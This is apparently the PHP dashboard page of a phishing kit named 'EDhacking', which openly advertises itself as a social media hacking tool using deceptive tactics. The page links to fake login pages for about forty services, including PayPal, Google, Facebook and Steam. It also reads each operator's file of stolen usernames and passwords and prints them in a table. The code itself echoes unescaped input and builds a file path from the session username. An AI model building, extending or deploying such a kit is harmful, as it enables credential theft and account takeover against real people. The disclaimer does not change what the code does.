<?php
session_start();
include 'ip.php';

$username = $_SESSION['username'];
if (!isset($_SESSION['username'])) {
    header("Location: login.php");
    exit();
}
?>
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=.5">
<meta name="theme-color" content="#161e21">
<meta charset="UTF-8">
    <script>
        function updatetdnks() {
            var name = ("<?php echo $username; ?>");
            if (name) {
                var anchorTags = document.getElementsByTagName("a");
                for (var i = 0; i < anchorTags.length; i++) {
                    var href = anchorTags[i].getAttribute("href");
                    if (href && href.indexOf("index.php") !== -1) {
                        href = href + (href.indexOf('?') !== -1 ? '&' : '?') + "n=" + encodeURIComponent(name);
                        anchorTags[i].setAttribute("href", href);
                    }
                }
            }
        }
    </script>

<script>
    const copyLinkButtons = document.querySelectorAll('.copy-link');

    copyLinkButtons.forEach(button => {
        button.addEventListener('click', event => {
            event.preventDefault();
            const link = event.currentTarget.getAttribute('href');
            copyToClipboard(link);
            alert('Link copied to clipboard: ' + link);
        });
    });

    function copyToClipboard(text) {
        const textArea = document.createElement('textarea');
        textArea.value = text;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
    }
</script>
    <style>
        td, a {
color: yellow;
font-family: Cabin;
text-decoration: none;
font-weight: 450;
font-size: 25px;
background-color: #212E34;
border-radius: 2px;
padding: 10px;
}

#td {

font-weight: 450;
font-size: 18px;
}
p {
font-family: Cabin;
color: white;
}
table {
border: 0.1px solid black;
width: 100%;
}

#data {
border: 0.1px solid black;
width: 8%;
}
    </style>
</head>
<body bgcolor="#161e21" onload="updatetdnks()">
    <div style="position: fixed; top: 0%; left: 0%; width: 100%; background-color: #1E2B2F; padding: 5px; box-shadow: 0px 2px 25px rgba(0, 0, 0, 0.8);">
<p style="color: white; font-weight: 200; font-size: 35px;">EDhacking</p></div>
<div style="padding: 50px;"></div>
<?php echo '<p style="color: white; font-weight: 600; font-size: 45px;">Welcome, ' . ucfirst($username) . '! </p>'; ?><p style="font-weight: 400; font-size: 25px;"><font color="#29799C">"</font>EDhacking<font color="#29799C">"</font> a free web application tool for social media hacking. <br>
This tool skillfully employs deceptive tactics, offering access to coveted credentials. <br><?php echo ucfirst($username); ?>, please do not use this tool to harm anyone.
The author is not responsible for any missue of this EDhacking Tool.
</p>
<table>
    <tr>
        <td><a href="adobe/index.php" class="copy-link">Adobe</a></td>
        <td><a href="badoo/index.php" class="copy-link">Badoo</a></td>
        <td><a href="deviantart/index.php" class="copy-link">Deviantart</a></td>
    </tr>
    <tr>
        <td><a href="discord/index.php" class="copy-link">Discord</a></td>
        <td><a href="dropbox/index.php" class="copy-link">Dropbox</a></td>
        <td><a href="ebay/index.php" class="copy-link">Ebay</a></td>
    </tr>
    <tr>
        <td><a href="facebook/index.php" class="copy-link">Facebook</a></td>		
        <td><a href="fb_messenger/index.php" class="copy-link">Facebook Messenger</a></td>
        <td><a href="github/index.php" class="copy-link">Github</a></td>
    </tr>
    <tr>
        <td><a href="gitlab/index.php" class="copy-link">Gitlab</a></td>
        <td><a href="google/index.php" class="copy-link">Google</a></td>
        <td><a href="google_new/index.php" class="copy-link">Google 2</a></td>
    </tr>
    <tr>
        <td><a href="google_poll/index.php" class="copy-link">Google Poll</a></td>
        <td><a href="ig_verify/index.php" class="copy-link">Instagram Verify</a></td>
        <td><a href="insta_followers/index.php" class="copy-link">Insta Followers</a></td>
    </tr>
    <tr>
        <td><a href="instagram/index.php" class="copy-link">Instagram</a></td>
        <td><a href="linkedin/index.php" class="copy-link">LinkedIn</a></td>
        <td><a href="mediafire/index.php" class="copy-link">Mediafire</a></td>
    </tr>
    <tr>
        <td><a href="microsoft/index.php" class="copy-link">Microsoft</a></td>
        <td><a href="netflix/index.php" class="copy-link">Netflix</a></td>
        <td><a href="origin/index.php" class="copy-link">Origin</a></td>
    </tr>
    <tr>
        <td><a href="paypal/index.php" class="copy-link">PayPal</a></td>
        <td><a href="pinterest/index.php" class="copy-link">Pinterest</a></td>
        <td><a href="playstation/index.php" class="copy-link">Playstation</a></td>
    </tr>
    <tr>
        <td><a href="protonmail/index.php" class="copy-link">Protonmail</a></td>
        <td><a href="quora/index.php" class="copy-link">Quora</a></td>
        <td><a href="reddit/index.php" class="copy-link">Reddit</a></td>
    </tr>
    <tr>
        <td><a href="roblox/index.php" class="copy-link">Roblox</a></td>
        <td><a href="spotify/index.php" class="copy-link">Spotify</a></td>
        <td><a href="stackoverflow/index.php" class="copy-link">Stack Overflow</a></td>
    </tr>
    <tr>
        <td><a href="steam/index.php" class="copy-link">Steam</a></td>
        <td><a href="tiktok/index.php" class="copy-link">Tik Tok</a></td>
        <td><a href="twitch/index.php" class="copy-link">Twitch</a></td>
    </tr>
    <tr>
        <td><a href="twitter/index.php" class="copy-link">Twitter</a></td>
        <td><a href="vk/index.php" class="copy-link">VK</a></td>
        <td><a href="vk_poll/index.php" class="copy-link">VK Poll</a></td>
    </tr>
    <tr>
        <td><a href="wordpress/index.php" class="copy-link">WordPress</a></td>
        <td><a href="xbox/index.php" class="copy-link">X Box</a></td>
        <td><a href="yahoo/index.php" class="copy-link">Yahoo</a></td>
    </tr>
    <tr>
        <td><a href="yandex/index.php" class="copy-link">Yandex</a></td>
    </tr>
</table>

<?php
error_reporting(0); // Turn off all error reporting
ini_set("display_errors", 0); // Prevent errors from being displayed

$fileContent = file_get_contents('aa/' . $username . '/usernames.txt');

if (!$fileContent) {
    echo "<p style='color: white; font-weight: 600; font-size: 45px;'>Data file not found...</p>";
}


$lines = explode("\n", $fileContent);
echo '<p style="color: white; font-weight: 600; font-size: 45px;">Data from Your Links</p><table id="data">';

$found = false; // Flag to track if any passwords were found

foreach ($lines as $line) {
    if (strpos($line, 'Pass:') !== false) {
        $parts = explode('Pass', $line);
        $username = trim($parts[0]);
        $password = trim($parts[1]);
        echo "<tr>";
        echo "<td id='td'>$username</td>";
        echo "<td id='td'>Password $password</td>";
        echo "</tr>";
        
        $found = true; // Password found
    }
}

echo "</table>";

?>
</p>
</body>
</html>